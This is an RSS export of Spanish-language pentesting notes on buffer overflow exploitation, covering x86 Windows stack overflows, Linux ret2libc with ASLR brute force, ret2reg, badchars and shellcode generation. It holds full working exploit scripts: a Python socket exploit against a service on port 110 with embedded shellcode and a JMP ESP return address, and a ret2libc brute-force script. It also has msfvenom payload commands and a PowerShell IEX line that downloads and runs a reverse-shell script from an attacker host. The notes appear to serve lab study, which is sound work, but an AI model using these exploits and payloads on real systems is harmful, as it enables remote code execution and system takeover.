Copy<br>Esto nos devolverá el OpCode de jmp ESP ( FFE4 = \xFF\xE4 ) el cual al no ser una dirección (Solo un OpCode) no debemos darle la vuelta como little endian.<br>Una vez con este OpCode haciendo uso de mona con el comando !mona modules podremos ver los módulos que se usan en el programa donde tendremos que buscar uno que tenga las 4 primeras columnas en FALSE para buscar (!mona find -s ""\xFF\xE4" -m {module_name}) si existe el OpCode JMP ESP dentro del modulo, en caso de que existe, devolverá múltiples direcciones de memoria y seleccionaremos una (La cual no tiene que contener badchars).<br>
En algunos casos puede ser que nos diga que se encontraron un total de 0 pointers, en este caso podemos hacer uso en lugar de "find" de "findwild" (!mona help findwild) para buscar por instrucciones (!mona findwild -s "JMP ESP")<br>Ahora nuestro EIP tiene que valer esta dirección en memoria encontrada dentro de uno de los módulos donde existe el OpCode dentro en una dirección en particular, la cual copiamos y representamos en little endian o, si estamos en python, con la librería struct la función pack.<br>#!/usr/bin/python3 

import socket
import sys 
from struct import pack 
ip = "192.168.1.34"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("&lt;L", 0x5f4a358f) # "&lt;L" para indicar que es littel endian (5f4a358f es una de las direcciones donde se encontro el OpCode JMP ESP del modulo seleccionado)
shellcode = (b"\xbd\xb9\xba\x5a\xae\xd9\xe5\xd9\x74\x24\xf4\x5f\x33\xc9"
b"\xb1\x52\x31\x6f\x12\x83\xc7\x04\x03\xd6\xb4\xb8\x5b\xd4"
b"\x21\xbe\xa4\x24\xb2\xdf\x2d\xc1\x83\xdf\x4a\x82\xb4\xef"
b"\x19\xc6\x38\x9b\x4c\xf2\xcb\xe9\x58\xf5\x7c\x47\xbf\x38"
b"\x7c\xf4\x83\x5b\xfe\x07\xd0\xbb\x3f\xc8\x25\xba\x78\x35"
b"\xc7\xee\xd1\x31\x7a\x1e\x55\x0f\x47\x95\x25\x81\xcf\x4a"
b"\xfd\xa0\xfe\xdd\x75\xfb\x20\xdc\x5a\x77\x69\xc6\xbf\xb2"
b"\x23\x7d\x0b\x48\xb2\x57\x45\xb1\x19\x96\x69\x40\x63\xdf"
b"\x4e\xbb\x16\x29\xad\x46\x21\xee\xcf\x9c\xa4\xf4\x68\x56"
b"\x1e\xd0\x89\xbb\xf9\x93\x86\x70\x8d\xfb\x8a\x87\x42\x70"
b"\xb6\x0c\x65\x56\x3e\x56\x42\x72\x1a\x0c\xeb\x23\xc6\xe3"
b"\x14\x33\xa9\x5c\xb1\x38\x44\x88\xc8\x63\x01\x7d\xe1\x9b"
b"\xd1\xe9\x72\xe8\xe3\xb6\x28\x66\x48\x3e\xf7\x71\xaf\x15"
b"\x4f\xed\x4e\x96\xb0\x24\x95\xc2\xe0\x5e\x3c\x6b\x6b\x9e"
b"\xc1\xbe\x3c\xce\x6d\x11\xfd\xbe\xcd\xc1\x95\xd4\xc1\x3e"
b"\x85\xd7\x0b\x57\x2c\x22\xdc\x98\x19\x2d\x3d\x71\x58\x2d"
b"\x3c\x3a\xd5\xcb\x54\x2c\xb0\x44\xc1\xd5\x99\x1e\x70\x19"
b"\x34\x5b\xb2\x91\xbb\x9c\x7d\x52\xb1\x8e\xea\x92\x8c\xec"
b"\xbd\xad\x3a\x98\x22\x3f\xa1\x58\x2c\x5c\x7e\x0f\x79\x92"
b"\x77\xc5\x97\x8d\x21\xfb\x65\x4b\x09\xbf\xb1\xa8\x94\x3e"
b"\x37\x94\xb2\x50\x81\x15\xff\x04\x5d\x40\xa9\xf2\x1b\x3a"
b"\x1b\xac\xf5\x91\xf5\x38\x83\xd9\xc5\x3e\x8c\x37\xb0\xde"
b"\x3d\xee\x85\xe1\xf2\x66\x02\x9a\xee\x16\xed\x71\xab\x37"
b"\x0c\x53\xc6\xdf\x89\x36\x6b\x82\x29\xed\xa8\xbb\xa9\x07"
b"\x51\x38\xb1\x62\x54\x04\x75\x9f\x24\x15\x10\x9f\x9b\x16"
b"\x31")

payload = b'PASS ' + before_eip + eip + shellcode

def bof(): 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)
    
    if(banner):
        s.send(b"USER dobliuw" + b'\r\n')
        response = s.recv(1024)
        print(response)
        s.send(payload + b'\r\n')
        s.close()


if __name__ == "__main__":
    bof()

Copy<br>Una vez que tengamos el espacio en memoria de donde se encontrará el OpCode, deberíamos verificar si esto es así, por lo que deberíamos agregar un breakpoint en el immunity debugger para verificar si en algún punto, en la ejecución del programa con nuestras cargas, el registro EIP vale la dirección de memoria ingresada. Si esto es así, el flujo de nuestro BOF va muy bien encaminado, solo faltaría un ultimo retoque. <br>Hasta el momento hayamos el offset para saber donde comenzamos a sobrescribir el registro EIP (Encargado de apuntar a la siguiente tarea a ejecutar ) para así posteriormente hallar un espacio en memoria que contenga el OpCode ( JMP ESP ) el cual es un OpCode que se encarga de hacer que el flujo del programa salte al registro ESP ( Encargado de la pila ) para poner esta dirección de memoria como valor del registro EIP, para cargar en la pila nuestro shellcode malicioso ( Creado ignorando los badchars hallados a partir del bytearray probado en el programa ) y como el EIP apunta al OpCode JMP ESP hacer que el flujo del programa salte a la pila (stack) donde esta nuestro shellcode (Instrucciones a bajo nivel).<br> El problema es que aveces no damos tiempo a que nuestro shellcode se ejecute ya que el procesador no llega a realizarlo en su tiempo, por lo que nos hace falta hacer uso de una de las técnicas que se suele usar en este caso como el uso de NOPs o el desplazamiento de la pila.<br>Por lo que, si quisiéramos hacer uso de NOPs simplemente deberíamos representar el byte \x90 varías veces, como 16 o 32 antes del shellcode.<br>
Por otro lado, si quisiéramos hacer uso del desplazamiento de la pila simplemente podríamos hacer otra vez uso de la herramienta de metasploit nasm_shell.rb <br># NOPs 
nops = b"\x90"*32

# STACK DISPLACEMENT

/usr/share/matasploit-framework/tools/exploit/nasm_shell.rb 
# Entramos en modo interactivo y tipeamos: 
sub esp,0x10
# Esto nos arroja un OpCode (83EC10) decrementa el valor del puntero de pila 10 bytes 
stack_displacement = b"\x83\xEC\x10"

Copy<br>De esta manera habríamos explotado un <a data-href="Buffer Overflow" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/4.-advanced/buffer-overflow/buffer-overflow.html" class="internal-link" target="_self" rel="noopener nofollow">Buffer Overflow</a> en una arquitectura x86 (32 bits).<br><br>#!/usr/bin/python3 

import socket
import sys 
from struct import pack 
ip = "192.168.1.34"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("&lt;L", 0x5f4a358f)
shellcode = (b"\xbd\xb9\xba\x5a\xae\xd9\xe5\xd9\x74\x24\xf4\x5f\x33\xc9"
b"\xb1\x52\x31\x6f\x12\x83\xc7\x04\x03\xd6\xb4\xb8\x5b\xd4"
b"\x21\xbe\xa4\x24\xb2\xdf\x2d\xc1\x83\xdf\x4a\x82\xb4\xef"
b"\x19\xc6\x38\x9b\x4c\xf2\xcb\xe9\x58\xf5\x7c\x47\xbf\x38"
b"\x7c\xf4\x83\x5b\xfe\x07\xd0\xbb\x3f\xc8\x25\xba\x78\x35"
b"\xc7\xee\xd1\x31\x7a\x1e\x55\x0f\x47\x95\x25\x81\xcf\x4a"
b"\xfd\xa0\xfe\xdd\x75\xfb\x20\xdc\x5a\x77\x69\xc6\xbf\xb2"
b"\x23\x7d\x0b\x48\xb2\x57\x45\xb1\x19\x96\x69\x40\x63\xdf"
b"\x4e\xbb\x16\x29\xad\x46\x21\xee\xcf\x9c\xa4\xf4\x68\x56"
b"\x1e\xd0\x89\xbb\xf9\x93\x86\x70\x8d\xfb\x8a\x87\x42\x70"
b"\xb6\x0c\x65\x56\x3e\x56\x42\x72\x1a\x0c\xeb\x23\xc6\xe3"
b"\x14\x33\xa9\x5c\xb1\x38\x44\x88\xc8\x63\x01\x7d\xe1\x9b"
b"\xd1\xe9\x72\xe8\xe3\xb6\x28\x66\x48\x3e\xf7\x71\xaf\x15"
b"\x4f\xed\x4e\x96\xb0\x24\x95\xc2\xe0\x5e\x3c\x6b\x6b\x9e"
b"\xc1\xbe\x3c\xce\x6d\x11\xfd\xbe\xcd\xc1\x95\xd4\xc1\x3e"
b"\x85\xd7\x0b\x57\x2c\x22\xdc\x98\x19\x2d\x3d\x71\x58\x2d"
b"\x3c\x3a\xd5\xcb\x54\x2c\xb0\x44\xc1\xd5\x99\x1e\x70\x19"
b"\x34\x5b\xb2\x91\xbb\x9c\x7d\x52\xb1\x8e\xea\x92\x8c\xec"
b"\xbd\xad\x3a\x98\x22\x3f\xa1\x58\x2c\x5c\x7e\x0f\x79\x92"
b"\x77\xc5\x97\x8d\x21\xfb\x65\x4b\x09\xbf\xb1\xa8\x94\x3e"
b"\x37\x94\xb2\x50\x81\x15\xff\x04\x5d\x40\xa9\xf2\x1b\x3a"
b"\x1b\xac\xf5\x91\xf5\x38\x83\xd9\xc5\x3e\x8c\x37\xb0\xde"
b"\x3d\xee\x85\xe1\xf2\x66\x02\x9a\xee\x16\xed\x71\xab\x37"
b"\x0c\x53\xc6\xdf\x89\x36\x6b\x82\x29\xed\xa8\xbb\xa9\x07"
b"\x51\x38\xb1\x62\x54\x04\x75\x9f\x24\x15\x10\x9f\x9b\x16"
b"\x31")

# USING NOPS 
#nops = b"\x90"*16

# USING STACK DISPLACEMENT 
stack_displacement = b"\x83\xEC\x10"

# USING NOPS 
#payload = b'PASS ' + before_eip + eip + nops + shellcode

# USING STACK DISPLACEMENT 
payload = b'PASS ' + before_eip + eip + stack_displacement + shellcode


def bof(): 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)
    
    if(banner):
        s.send(b"USER dobliuw" + b'\r\n') #\r\n manera de simular ENTER
        response = s.recv(1024)
        print(response)
        s.send(payload + b'\r\n')
        s.close()


if __name__ == "__main__":
    bof()
Copy<br>Como adicional, si quisiéramos ejecutar un comando en particular en lugar de entablar una de las <a data-href="Shells" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/explotation-concepts/shells.html" class="internal-link" target="_self" rel="noopener nofollow">Shells</a> (Reverse Shell), podríamos usar otro payload con la herramienta msfvenom<br>msfvenom -p windows/exec CMD="{command}" --platform windows -a x86 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread<br>Por ejemplo el comando podría ser powershell IEX(New-Object Net.WebClient).dowloadString('http://192.168.1.33:443/reverse.ps1') para descargarnos un recurso en particular de nuestra url y posteriormente ejecutarlo con powershell, el script podría ser del <a data-tooltip-position="top" aria-label="https://github.com/samratashok/nishang" rel="noopener nofollow" class="external-link" href="https://github.com/samratashok/nishang" target="_blank">repositorio de github de nishang</a>.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/4.-advanced/buffer-overflow/buffer-overflow-escenarios/buffer-overflow-básico-x86.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/4. Advanced/Buffer Overflow/Buffer Overflow Escenarios/Buffer Overflow básico x86.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:11 GMT</pubDate></item><item><title><![CDATA[Buffer Overflow x86 linux]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:avanzado" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#avanzado</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:avanzado" class="tag" target="_blank" rel="noopener nofollow">#avanzado</a> 
<br><br><br>Cada vez que nos encontramos con un programa en C que utiliza funciones típicas como printf, scanf, put, etc. todas estas son compiladas en un solo archivo que es la librería estándar de C o libc.<br>
Ret2libc es una técnica que se basa en ejecutar código que no se encuentra en la pila sino en un sector de la memoria de libc, que es ejecutable. Es decir, el código utilizado para vulnerar el programa son funciones dentro de esta librería. <br><br><br>En esta ejemplo nos podríamos enfrentar a un binario vulnerable a buffer overflow en un sistema de 32 bits con protecciones activas (NX) y ASLR activado (Aleatoriedad den la disposición del espacio de direcciones, es decir un técnica de seguridad informática). <br>Como debugger usaremos la herramienta gdb (sudo apt install gdb) y lo fusionaremos como un script llamado <a data-tooltip-position="top" aria-label="https://github.com/longld/peda" rel="noopener nofollow" class="external-link" href="https://github.com/longld/peda" target="_blank">peda</a> (El cual cumple la misma función que mona en el Immunity Debugger). <br>El proceso para explotar el Buffer Overflow es lo mismo de siempre pero con algunas variaciones, en este caso el binario contara con una protección de tipo NX lo que nos impide capturar el registro EIP para apuntar al registro ESP donde en el stack estará nuestro shellcode, debido a que NX deriva de No Execution, y nos impide poder ejecutar nuestro shellcode almacenado en la pila. <br>Por lo que el proceso inicial es el mismo de siempre, primero tenemos que capturar el offset: <br># Ejecutamos el binario con el debugger gdb en modo "quiet"
gdb {binary} -q 
# Creamos un pattern para sobrescribir la pila y posteriormente sacar nuestro offset 
patter_create {size}
# Corremos el binario con el output "malicioso"
r {patter_created}
# Una vez sobrescrito los registros del sistema, calculamos el offset en base al valor almacenado en el registro EIP 
pattern offset $eip 
Copy<br>Una vez con el offset, podríamos verificar si existen protecciones para este binario: <br># Una vez en gdb: 
checksec 
Copy<br>En este ejemplo, contamos con un binario el cual tiene la protección NX activada, por lo que podemos empezar a pensar en un ret2libc, mediante la captura del registro EIP, este tiene que apuntar a la dirección de system, exit y el string bin sh.<br>Pero para esto, debemos primeramente determinar si el ASLR esta habilitado: <br># Ver librerias compartidas del binario utilizado
ldd {binary}
#  Quedarnos con la dirección de memoria de la librería libc 
ldd {binary} | grep libc | awk 'NF{print $NF}' |  tr -d '()'
# Con esto, podríamos ver si ejecutamos 10, 20 u x veces esto comando, si las mismas cambian, en caso de que las direcciones cambien quiere decir que el ASLR esta habilitado: 
for i in $(seq 1 20); do ldd {binary} | grep libc | awk 'NF{print $NF}' | tr -d '()'; done 

# Otra manera de ver si el ASLR esta activado o no es: 
cat /proc/sys/kernel/randomize_va_space

Copy<br>En caso de que el ASLR este desactivado, las direcciones de memoria de las funciones system, exit y la cadena bin sh se pueden sacar con peda desde el propio binario siendo estas estáticas: <br># Ver funciones disponibles
info functions 
# Meter breakpoint en la función main
b *main
# Ejecutar el programa con cualquier cosa para que cuando se ejecute se detenga en el comienzo debido al breakpoint
r 'AAAAAAAAAAAAAAAAAA'
# Ahora podemos realizar consultas...
# Mostrar la dirección de system 
p system 
# Mostrar la dirección de exit
p exit 
# Buscar la cadena "bin sh"
find "/bin/sh"
Copy<br>Con dichas direcciónes podríamos realizar el Buffer Overflow ingresando la cantidad de caracteres necesarios según el offset, para posteriormente una vez controlado el registro EIP apuntar a la dirección de system, luego exit y "/bin/sh". <br>Ahora, en caso de que el ASLR este activado, las direcciones de memoria cambian constantemente, esto complica la labor del atacante, PERO, en maquinas x86 las direcciones no son muy largas, por lo que si ejecutamos 1000+ veces el comando, pueden existir coincidencias, es decir, que al ser direcciones al no ser muy grandes muchas veces  las direcciones coincidirán entre si, es decir, debemos hacer uso de la fuerza bruta.<br>Ejecutando muchas veces el binario hasta que libc valga una dirección, una vez que coincida la dirección base de libc deberíamos calcular las distancias para llegar a las direcciones reales de system, exit y "/bin/sh". <br>Como dijimos, en este caso deberíamos tomar una dirección random de la librería libc para que con esta junto a los offset de las funciones mencionadas, calcular el espacio real en memoria: <br># Capturar una dirección de memoria base de libc 
ldd {binary} | grep libc | awk 'NF{print $NF}' | tr -d '()' 
# Instalar binutils para poder usar una herramienta para sacar los offset de las funciones 
sudo apt install binutils
# Hacer uso de "readelf" para obtener información de binarios elf (Listar la tabla de simbolos )
ldd {binary}
# stdout: 
#      linux-gate.so.1 =&gt;  (0xb774a000)
#	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7588000)
#	/lib/ld-linux.so.2 (0xb774b000)

# libc_path = /lib/i386-linux-gnu/libc.so.6) 
# Obtener offset de las funciones para sumarselos a la direccion base de libc
readelf -s {libc_path} | grep -E " system| exit"

# Obtener el offset de la cadena "/bin/sh"
strings -a -t x {libc_path} | grep "/bin/sh"
Copy<br>De esta manera, una vez obtenidas las direcciones, simplemente deberíamos sumarlas a la dirección base de libc y tendríamos el buffer overflow x86 linux ret2libc <br><br>#!/usr/bin/python3

import subprocess, sys
from struct import pack

# Global Vars

# ret2libc ---&gt; system + exit + /bin/sh

offset = 112
before_eip = b"A"*offset

# BASE_LIBC_ADDR:
# ldd {binary} | grep libc | awk 'NF{print $NF}' | tr -d '()'
# b75db000
base_libc_addr = 0xb75db000

# SYSTEM_ADDR_OFF &amp; EXIT_ADDR_OFF:
# dobliuw@ubuntu:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E ' exit| system'
#   141: 0002e9e0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
#  1457: 0003adb0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0

# "BIN_SH_OFF:
# strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
# 15bb2b /bin/sh

# OFFSET DE LAS FUNCIONES:
system_addr_off = 0x0003adb0
exit_addr_off = 0x0002e9e0
bin_sh_off = 0x0015bb2b

# CALCULO DE LAS DIRECCIÓNES REALES:
system_addr = pack("&lt;L", base_libc_addr + system_addr_off)
exit_addr = pack("&lt;L", base_libc_addr + exit_addr_off)
bin_sh = pack("&lt;L", base_libc_addr + bin_sh_off)

payload = before_eip + system_addr + exit_addr + bin_sh


def exploit():
	while True:
		result = subprocess.run(["sudo", "/usr/bin/custom", payload])
		if result.returncode == 0:
			print("\n\n\t[!] Quiting...\n\n")
			sys.exit(0)


if __name__ == "__main__":
	exploit()
Copy<br><br><br>Adicionalmente, algo que de podría haber intentado en este caso, es un ret2reg, es decir retornar a un registro. Muchas veces, antes de realizar un ret2libc y realizar fuerza bruta en caso de que el sistema tenga el ASLR activado, podríamos intentar hacer uso de esta técnica la cual consiste en hacer que el registro EIP valga una dirección en memoria perteneciente al opcode CALL EAX , el cual así como JMP ESP es un OpCode el cual conduce el flujo del programa al registro ESP, el CALL EAX conduce el flujo del programa al registro EAX. <br>En algunos casos, al sobrescribir el búfer, se puede generar el caso en el que el inicio de nuestra cadena ingresada comience por el registro EAX, siendo este caso un buen momento para pensar en ret2reg, donde si contamos con la suerte de que el binario vulnerable contenga direcciónes de CALL EAX al estar alojadas en el propio binario, estas son estáticas. <br># Listar información de los registros con gbd
i r 
info registers
# Listar 16 palabras de un registro (Ej, eax) con gdb
x/16wx $eax 
Copy<br><br>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
# nasm &gt; CALL EAX 
# 00000000  FFD0              call eax
Copy<br><br>objdump -d {binary} | grep -i "FF D0"
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/4.-advanced/buffer-overflow/buffer-overflow-escenarios/buffer-overflow-x86-linux.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/4. Advanced/Buffer Overflow/Buffer Overflow Escenarios/Buffer Overflow x86 linux.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 27 Feb 2024 00:14:53 GMT</pubDate></item><item><title><![CDATA[Buffer Overflow]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:avanzado" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#avanzado</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:avanzado" class="tag" target="_blank" rel="noopener nofollow">#avanzado</a> 
<br><br><br>El buffer overflow (Desbordamiento de búfer) es una vulnerabilidad común en software que puede permitir a un atacante ejecutar código maliciosos o tomar control de un sistema comprometido. <br>Esta vulnerabilidad se produce cuando un programa intentan almacenar más datos en un búfer (zona de memoria temporal para almacenamiento de datos) de lo que se había previsto, y al exceder la capacidad del búfer, los datos adicionales se escriben en otras zonas de memoria adyacentes. <br>Esto puede permitir que un atacante escriba código maliciosos en estas zonas de memoria y sobrescriba otros datos críticos del sistema, como la dirección de retorno de una función o la dirección de memoria donde se almacena una variable, permitiendo al atacante tomar el control del flujo del programa. <br>Los impacto de un buffer overflow pueden ser graves, ya que un atacante puede aprovechar esta vulnerabilidad para obtener información confidencial, robar datos o incluso tomar el control completo sistema. Si los atacantes disponen del conocimiento necesario, pueden incluso conseguir ejecutar comandos maliciosos en el sistema comprometido.<br><br><br>
<br>


<br>Cuando hablamos de la fase de fuzzing hacemos referencia a la fase inicial de la explotación de un buffer overflow, una de las primeras tareas la cual es averiguar los límites del programa objetivo. Esto se hace probando a introducir más caracteres de los debidos en diferentes campos de entrada del programa, como una cadena de texto o un archivo, hasta que se detecte que la aplicación se corrompe o falla. <br>
<br>


<br>Una vez que se encuentra el límite del campo de entrada, el siguiente paso es averiguar el offset, que corresponde al número exacto de caracteres que se deben introducir para provocar una corrupción en el programa y, por lo tanto, para sobrescribir el valor del registro EIP. <br>El registro EIP (Extended Instruction Pointer) es un registro de la CPU que apunta a la dirección de memoria donde se encuentra la siguiente instrucción que se va a ejecutar. En un buffer overflow exitoso, el valor del registro EIP se sobrescribe con una dirección controlada por el atacante, lo que permite ejecutar código malicioso en lugar del código original del programa. <br>Por lo tanto, uno de los objetivos iniciales es averiguar el offset para determinar el número exacto de caracteres que se deben introducir en el campo de entrada para sobrescribir el valor del registro EIP y apuntar a la dirección de memoria controlada por el atacante. Una vez que se conoce el offset, el atacante puede diseñar un exploit personalizado para el programa objetivo que permita tomar control del registro EIP y ejecutar código malicioso. <br>
<br>


<br>Una vez que se ha encontrado el offset y se ha sobrescrito el valor del registro EIP en un buffer overflow, el siguiente paso es identificar en qué parte de la memoria se están representando los caracteres introducidos en el campo de entrada. <br>Después de sobrescribir el valor del registro EIP, cualquier carácter adicional que introduzcamos en el campo de entrada, veremos desde el immunity debugger que (En este caso en particular) se estarán representando al comienzo de la pila (stack) en el registro ESP (Extended Stack Pointer). El ESP es un registro de la CPU que se utiliza para manejar la pila (Stack) en un programa. La pila es una zona de memoria temporal que se utiliza para almacenar valores y direcciones de retorno de las funciones a medida que se van llamando en el programa.<br>Una vez que se ha identificado la ubicación de los caracteres en la memoria, la idea principal en este punto es introducir un shellcode en esa ubicación, que son instrucciones de bajo nivel las cuales en este caso corresponderán a una instrucción maliciosa. <br>El shellcode se introduce en la pila y se coloca en la misma dirección de memoria donde se colocaron los caracteres sobrescritos. En otras palabras, se aprovecha el desbordamiento del búfer para ejecutar el shellcode malicioso y tomar el control del sistema. <br>Es importante tener en cuenta que el shellcode debe ser diseñado cuidadosamente para evitar que se detecte como un programa malicioso, y debe ser compatible con la arquitectura de la CPU y el sistema operativo que se está atacando. <br>(En resumen, la asignación de espacio para el shellcode implica identificar la ubicación en la memoria donde se colocarlos los caracteres sobrescritos en el buffer overflow y colocar allí el shellcode malicioso. Sin embarco, no todos los caracteres del shellcode pueden ser interpretados. Aquí es donde entran en juego los badchars.<br>
<br>


<br>En la generación de nuestro shellcode malicioso para la explotación del buffer overflow, es posible que algunos caracteres no sean interpretados correctamente por el programa objetivo. estos caracteres se conocen como badchars y pueden causar que el shellcode falle o que el programa objetivo se cierre inesperadamente. <br>Para evitar esto, es importante identificar y eliminar los badchars del shellcode. Podremos hacer esto con las funcionalidades que ofrece mona en el Immunity Debugger para generar diferentes bytearrays con casi todos los caracteres representados, y luego identificar los caracteres que el programa objetivo no logra interpretar.<br>Una vez identificados los badchars, se pueden descartar del shellcode final y genera un nuevo shellcode que no contenga estos caracteres. Para identificar los badchars se pueden utilizar diferentes técnicas, como la introducción de diferentes bytearrays con caracteres hexadecimales consecutivos, que permiten identificar los caracteres que el programa objetivo no logra interpreatar. <br>Estos caracteres irán representados en la pila (ESP), que será donde veremos qué caracteres son los que no están siendo representados, identificando así los badchars.<br>
<br>


<br>Una vez que se ha generado el shellcode malicioso y se han detectado los badchars, el siguiente paso es hacer que el flujo del programa entre en el shellcode para que sea interpretado. La idea es hacer que el registro EIP apunte a una dirección de memoria donde se aplique un opcode que realice un salto al registro ESP (JMP ESP), que es donde se encuentra el shellcode. Esto es así dado que de primeras no podemos hacer que el EIP apunte directamente a nuestro shellcode. <br>Para encontrar el opcode JMP ESP, se pueden utilizar diferentes herramientas, como mona.py, que permite buscar opcodes en módulos específicos de la memoria del programa objetivo. Una vez que se ha encontrado el opcode JMP ESP, se puede sobrescribir el valor del registro EIP con la dirección de memoria donde se encuentra el opcode, lo que permitirá saltar al registro ESP y ejecutar el shellcode malicioso.<br>La búsqueda de opcodes para entrar al registro ESP y cargar el shellcode es una técnica utilizada para hacer que el flujo del programa entre en el shellcode para que sea interpretado. Se utiliza el opcode JMP ESP para saltar a la dirección de memoria del registro ESP, donde se encuentra el shellcode. <br>
<br>


<br>Una vez que se ha encontrado la dirección del opcode que aplica el salto al registro ESP, es posible que el shellcode no sea interpretado correctamente debido a que su ejecución puede requerir más tiempo del que el procesador tiene disponible antes de continuar con la siguiente instrucción del programa.<br>Para solucionar este problema, se suele utilizar técnicas como la introducción de NOPs (Instrucciones de no operación) antes del shellcode en la pila. Los NOPs no realizan ninguna operación, pero permiten que el procesador tenga tiempo adicional para interpretar el shellcode antes de continuar con la siguiente instrucción del programa.<br>Otra técnica que se suele utilizar es el desplazamiento en la pila, que implica modificar el registro ESP para reservar espacio adicional para el shellcode y permitir que se ejecutar sin problemas. por ejemplo, se puede utilizar la instrucción sub esp,0x10 para desplazar el registro ESP 16 bytes hacia abajo en la pila y reservar espacio adicional para el shellcode.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/4.-advanced/buffer-overflow/buffer-overflow.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/4. Advanced/Buffer Overflow/Buffer Overflow.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 11 Mar 2024 23:45:02 GMT</pubDate></item><item><title><![CDATA[Shellcodes]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:avanzado" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#avanzado</a> <a class="tag" href="https://dobliuw.com/?query=tag:bof" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#bof</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:avanzado" class="tag" target="_blank" rel="noopener nofollow">#avanzado</a> <a href="https://dobliuw.com?query=tag:bof" class="tag" target="_blank" rel="noopener nofollow">#bof</a> 
<br><br><br>Los shellcodes son programas pequeños y altamente optimizados que se utilizan para explotar vulnerabilidades de seguridad y ejecutar código malicioso en un máquina objetivo. Los shellcodes suele ser escritos en lenguaje ensamblador para garantizar una ejecución rápida y eficiente. <br>Para escribir shellcodes propios primero hay que entender múltiples cosas, por ejemplo, usando la herramienta msfvenom vamos a crear un binario compilado básico para linux<br># La extensión de archivo ELF, es un acrónimo de Formato ejecutable y vinculable para sistemas Unix
msfvenom -p linux/x86/exec CMD="echo 'Hola mundo'" -f elf -o binary 
Copy<br>En este caso estamos creando un binario con output llamado binario el cual ejecute en sistemas linux de 32 bits el comando echo 'Hola mundo'. <br>Ahora, en lugar de compilar el binario, vamos a indicarle a la herramienta que nos lo muestre en formato raw. <br>msfvenom -p linux/x86/exec CMD="echo 'Hola mundo'" -f raw
# [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
# [-] No arch selected, selecting arch: x86 from the payload
# No encoder specified, outputting raw payload
# Payload size: 53 bytes
# j
#  XRfh-ch/shh/binRecho 'Hola mundo'WS̀

Copy<br>Esto es un payload de 32 bytes, si lo vemos en hexadecimal: <br>msfvenom -p linux/x86/exec CMD="echo 'Hola mundo'" -f raw | xxd
# [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
# [-] No arch selected, selecting arch: x86 from the payload
# No encoder specified, outputting raw payload
# Payload size: 53 bytes

